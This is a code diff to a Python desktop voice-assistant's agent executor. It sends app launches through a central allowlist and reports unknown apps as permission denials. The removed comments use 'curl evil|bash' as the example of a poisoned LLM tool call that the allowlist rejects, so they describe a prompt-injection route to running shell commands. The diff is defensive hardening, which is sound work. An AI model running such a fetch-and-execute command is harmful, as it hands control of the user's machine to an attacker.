@@ -31,6 +31,7 @@ try:
 except Exception:
     _NVML_OK = False
 
+from action import app_launcher
 from action.tools.screen_tool import ScreenTool
 from action.tools.web_tools import get_weather, web_search
 from cognition.agent_core.schema import PermissionDenial
@@ -172,15 +173,6 @@ class AgentExecutor:
         # input() default was unanswerable in voice mode (audit C3).
         self._confirm     = confirm_callback
 
-        # App-launch allowlist: the only commands open_app may execute. LLM tool
-        # calls cannot introduce new commands here, so a poisoned tool call
-        # (e.g. command="curl evil|bash") is rejected. Mirrors FastRouter._APP_MAP.
-        self._app_allowlist: frozenset[str] = frozenset({
-            "start chrome", "notepad", "calc", "start spotify",
-            "code", "start discord",
-            r'start "" "%LOCALAPPDATA%\Todoist\Todoist.exe"',
-        })
-
         # Sprint D: ScreenTool — instantiated once, reused across all calls
         self._screen = ScreenTool(
             screenshot_dir=getattr(config, "screenshot_dir", "data/screenshots")
@@ -234,6 +226,12 @@ class AgentExecutor:
             try:
                 result = await self._dispatch(tool, args)
                 results.append({"tool": tool, "status": "ok", "result": result})
+            except app_launcher.AppNotAllowed as e:
+                log.warning("Tool %s denied: %s", tool, e)
+                results.append({
+                    "tool": tool, "status": "denied", "reason": str(e), "code": e.code,
+                    "denial": PermissionDenial(tool_name=tool, reason=str(e)),
+                })
             except Exception as e:
                 log.error("Tool %s failed: %s", tool, e)
                 results.append({"tool": tool, "status": "error", "error": str(e)})
@@ -354,14 +352,13 @@ class AgentExecutor:
             return await self._screen.key_up(str(args.get("key", "")))
 
         elif tool == "open_app":
-            # SECURITY: only launch commands from the app allowlist. A poisoned
-            # tool call (command="curl evil|bash") is rejected here. FastRouter
-            # supplies allowlisted commands from its trusted _APP_MAP; anything
-            # else falls back to ScreenTool's name-based launch (no shell).
-            command = args.get("command")
-            if command:
-                return await self._launch_subprocess(str(command), str(args.get("name", command)))
-            return await self._screen.open_app(str(args.get("name", "")))
+            # SECURITY: every launch goes through the one allowlist in
+            # action/app_launcher.py — FastRouter sends an allowlist key ("app"),
+            # the LLM sends a name. Nothing the caller supplies is executed or
+            # shown to a shell; an unknown name raises AppNotAllowed (denied).
+            requested = args.get("app") or args.get("name") or args.get("command") or ""
+            display = await asyncio.to_thread(app_launcher.launch, str(requested))
+            return f"Opening {display}, Sir."
 
         elif tool == "open_url":
             url  = str(args.get("url", ""))
@@ -579,20 +576,6 @@ class AgentExecutor:
         p = Path(path)
         self._check_sandbox(p)
         return [str(x) for x in sorted(p.iterdir())][:100]
-
-    async def _launch_subprocess(self, command: str, name: str) -> str:
-        # SECURITY: only allowlisted launch commands run. These are trusted
-        # constants from FastRouter._APP_MAP, so shell=True is acceptable *for
-        # these specific strings only* (Windows `start`/env-var expansion needs
-        # the shell). An LLM-supplied command outside the allowlist is refused.
-        if command not in self._app_allowlist:
-            reason = f"app command not in allowlist: {command[:80]}"
-            log.warning("open_app denied: %s", reason)
-            return f"I can't launch that, Sir. {reason}"
-        import subprocess
-        await asyncio.to_thread(lambda: subprocess.Popen(command, shell=True))
-        return f"Opening {name}, Sir."
-
 
     # ── Clipboard ─────────────────────────────────────────────────────────────
 
